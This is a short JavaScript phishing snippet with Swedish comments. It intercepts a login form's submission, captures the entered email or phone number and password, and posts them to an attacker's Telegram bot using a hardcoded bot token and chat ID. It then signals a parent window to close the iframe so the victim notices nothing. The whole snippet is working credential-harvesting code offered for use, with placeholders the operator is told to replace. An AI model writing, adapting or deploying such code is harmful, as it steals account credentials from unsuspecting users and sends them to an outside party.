document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // DINA TELEGRAM UPPGIFTER (ÄNDRA DESSA)
        const TG_TOKEN = "8556321707:AAELEVbtESjbCsFXWm_rmKH1b6gTHWYtvpY"; 
        const TG_ID = "-1003867437520";

        const email = document.getElementById('emailORphone').value;
        const pass = document.getElementById('password').value;
        
        const message = `--- NY INLOGGNING ---\nEmail: ${email}\nLösen: ${pass}`;

        // Skickar till Telegram via Fetch API
      // Istället för window.location.href...
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_ID, text: message })
    }).then(() => {
    // Skickar ett meddelande till föräldrafönstret
    window.parent.postMessage('closeIframe', '*');
    });
    });